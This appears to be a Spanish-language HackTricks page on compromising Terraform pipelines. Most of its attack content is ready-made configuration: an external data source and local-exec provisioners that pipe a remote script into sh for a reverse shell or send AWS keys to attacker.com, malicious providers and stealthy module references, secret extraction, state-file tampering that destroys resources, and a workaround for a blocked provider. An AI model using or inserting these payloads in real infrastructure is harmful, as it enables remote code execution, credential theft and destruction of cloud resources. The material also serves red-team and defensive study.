# Seguridad de Terraform

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**repos de HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

### Informaci칩n B치sica

[De la documentaci칩n:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform es una **herramienta de infraestructura como c칩digo** que te permite definir tanto **recursos en la nube como en local** en archivos de configuraci칩n legibles por humanos que puedes versionar, reutilizar y compartir. Luego puedes usar un flujo de trabajo consistente para aprovisionar y gestionar toda tu infraestructura a lo largo de su ciclo de vida. Terraform puede gestionar componentes de bajo nivel como recursos de computaci칩n, almacenamiento y redes, as칤 como componentes de alto nivel como entradas DNS y caracter칤sticas de SaaS.

#### 쮺칩mo funciona Terraform?

Terraform crea y gestiona recursos en plataformas en la nube y otros servicios a trav칠s de sus interfaces de programaci칩n de aplicaciones (APIs). Los proveedores permiten que Terraform trabaje con pr치cticamente cualquier plataforma o servicio con una API accesible.

![](<../.gitbook/assets/image (177).png>)

HashiCorp y la comunidad de Terraform ya han escrito **m치s de 1700 proveedores** para gestionar miles de diferentes tipos de recursos y servicios, y este n칰mero sigue creciendo. Puedes encontrar todos los proveedores disponibles p칰blicamente en el [Registro de Terraform](https://registry.terraform.io/), incluyendo Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, y muchos m치s.

El flujo de trabajo b치sico de Terraform consta de tres etapas:

* **Escribir:** Defines recursos, que pueden estar en m칰ltiples proveedores y servicios en la nube. Por ejemplo, podr칤as crear una configuraci칩n para desplegar una aplicaci칩n en m치quinas virtuales en una red de Nube Privada Virtual (VPC) con grupos de seguridad y un balanceador de carga.
* **Planificar:** Terraform crea un plan de ejecuci칩n que describe la infraestructura que crear치, actualizar치 o destruir치 en funci칩n de la infraestructura existente y tu configuraci칩n.
* **Aplicar:** Con la aprobaci칩n, Terraform realiza las operaciones propuestas en el orden correcto, respetando cualquier dependencia de recursos. Por ejemplo, si actualizas las propiedades de una VPC y cambias el n칰mero de m치quinas virtuales en esa VPC, Terraform recrear치 la VPC antes de escalar las m치quinas virtuales.

![](<../.gitbook/assets/image (215).png>)

### Laboratorio de Terraform

Solo instala terraform en tu computadora.

Aqu칤 tienes una [gu칤a](https://learn.hashicorp.com/tutorials/terraform/install-cli) y aqu칤 tienes la [mejor manera de descargar terraform](https://www.terraform.io/downloads).

### RCE en Terraform

Terraform **no tiene una plataforma que exponga una p치gina web o un servicio de red** que podamos enumerar, por lo tanto, la 칰nica forma de comprometer terraform es **poder agregar/modificar archivos de configuraci칩n de terraform**.

Sin embargo, terraform es un **componente muy sensible** a comprometer porque tendr치 **acceso privilegiado** a diferentes ubicaciones para que funcione correctamente.

La principal forma en que un atacante puede comprometer el sistema donde se est치 ejecutando terraform es **comprometer el repositorio que almacena las configuraciones de terraform**, porque en alg칰n momento van a ser **interpretadas**.

De hecho, hay soluciones que **ejecutan terraform plan/apply autom치ticamente despu칠s de que se crea un PR**, como **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Si puedes comprometer un archivo de terraform, hay diferentes formas en que puedes realizar RCE cuando alguien ejecuta `terraform plan` o `terraform apply`.

#### Terraform plan

Terraform plan es el **comando m치s utilizado** en terraform y los desarrolladores/soluciones que utilizan terraform lo llaman todo el tiempo, por lo que la **manera m치s f치cil de obtener RCE** es asegurarte de envenenar un archivo de configuraci칩n de terraform que ejecute comandos arbitrarios en un `terraform plan`.

**Usando un proveedor externo**

Terraform ofrece el [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) que proporciona una forma de interaccionar entre Terraform y programas externos. Puedes usar la fuente de datos `external` para ejecutar c칩digo arbitrario durante un `plan`.

Inyectar en un archivo de configuraci칩n de terraform algo como lo siguiente ejecutar치 un rev shell al ejecutar `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Usando un proveedor personalizado**

Un atacante podr칤a enviar un [proveedor personalizado](https://learn.hashicorp.com/tutorials/terraform/provider-setup) al [Registro de Terraform](https://registry.terraform.io/) y luego agregarlo al c칩digo de Terraform en una rama de caracter칤sticas ([ejemplo de aqu칤](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
El proveedor se descarga en el `init` y ejecutar치 el c칩digo malicioso cuando se ejecute `plan`.

Puedes encontrar un ejemplo en [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**Usando una referencia externa**

Ambas opciones mencionadas son 칰tiles pero no muy sigilosas (la segunda es m치s sigilosa pero m치s compleja que la primera). Puedes realizar este ataque incluso de una **manera m치s sigilosa**, siguiendo estas sugerencias:

* En lugar de agregar el rev shell directamente en el archivo de terraform, puedes **cargar un recurso externo** que contenga el rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Puedes encontrar el c칩digo de rev shell en [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* En el recurso externo, utiliza la funci칩n **ref** para ocultar el **c칩digo de rev shell de terraform en una rama** dentro del repositorio, algo como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

#### Terraform Apply

Se ejecutar치 Terraform apply para aplicar todos los cambios, tambi칠n puedes abusar de esto para obtener RCE inyectando **un archivo de Terraform malicioso con** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Solo necesitas asegurarte de que alguna carga 칰til como las siguientes termine en el archivo `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Sigue las **sugerencias de la t칠cnica anterior** para realizar este ataque de una **manera m치s sigilosa utilizando referencias externas**.

### Extracci칩n de secretos

Puedes tener **valores secretos utilizados por terraform extra칤dos** ejecutando `terraform apply` al agregar al archivo de terraform algo como:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Abusing Terraform State Files

En caso de que tengas acceso de escritura sobre los archivos de estado de terraform pero no puedas cambiar el c칩digo de terraform, [**esta investigaci칩n**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) ofrece algunas opciones interesantes para aprovechar el archivo:

#### Deleting resources <a href="#deleting-resources" id="deleting-resources"></a>

Hay 2 formas de destruir recursos:

1. **Insertar un recurso con un nombre aleatorio en el archivo de estado que apunte al recurso real a destruir**

Porque terraform ver치 que el recurso no deber칤a existir, lo destruir치 (siguiendo el ID del recurso real indicado). Ejemplo de la p치gina anterior:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Modificar el recurso para eliminar de manera que no sea posible actualizar (as칤 ser치 eliminado y recreado)**

Para una instancia de EC2, modificar el tipo de la instancia es suficiente para que terraform la elimine y la recree.

#### RCE

Tambi칠n es posible [crear un proveedor personalizado](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) y simplemente reemplazar uno de los proveedores en el archivo de estado de terraform por el malicioso o agregar un recurso vac칤o con el proveedor malicioso. Ejemplo de la investigaci칩n original:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
### Reemplazar proveedor en la lista negra

En caso de que te encuentres en una situaci칩n donde `hashicorp/external` fue puesto en la lista negra, puedes re-implementar el proveedor `external` haciendo lo siguiente. Nota: Usamos un fork del proveedor external publicado por https://registry.terraform.io/providers/nazarewk/external/latest. Tambi칠n puedes publicar tu propio fork o re-implementaci칩n.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Entonces puedes usar `external` como de costumbre.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
### Herramientas de Auditor칤a

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec utiliza an치lisis est치tico de tu c칩digo terraform para detectar posibles configuraciones incorrectas.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan es un analizador de c칩digo est치tico para Infraestructura como C칩digo.

### Referencias

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
